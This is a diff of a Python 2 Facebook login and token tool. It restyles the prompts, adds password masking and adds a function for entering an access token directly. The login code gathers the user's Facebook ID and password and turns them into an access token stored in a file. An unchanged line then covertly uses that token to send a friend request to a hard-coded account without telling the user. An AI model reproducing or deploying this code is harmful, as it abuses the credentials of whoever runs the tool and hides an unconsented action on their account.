@@ -103,24 +103,23 @@ while (loop == 'true'):
     else:
         print "Wrong Username"
         os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
-
+	
 def login():
-	os.system('clear')
+	os.system('reset')
 	try:
 		toket = open('login.txt','r')
 		menu() 
 	except (KeyError,IOError):
-		os.system('clear')
+		os.system('reset')
 		print logo
-		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
-		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
+		print('\033[1;96m[☆] \033[1;92mLOGIN YouR FACEBOOK \033[1;91m[☆]')
+		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
+		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+			print"\n\033[1;91m[!] No connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -139,28 +138,52 @@ def login():
 				url = "https://api.facebook.com/restserver.php"
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				zedd = open("login.txt", 'w')
+				zedd.write(z['access_token'])
+				zedd.close()
+				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				os.system('xdg-open https://github.com/CrazyLolz100')
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+				print"\n\033[1;91m[!] No connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
+			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
+			print("\n\033[1;92m[#] Harap Login Ulang !")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
+			print("\n\033[1;91m[!] Login Failed")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
+			
+##### TOKEN #####
+def tokenz():
+	os.system('reset')
+	print logo
+	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		menu()
+	except KeyError:
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			keluar()
+		elif e =="y":
+			login()
+		else:
+			keluar()
 
-
+		
 def menu():
 	os.system('clear')
 	try:
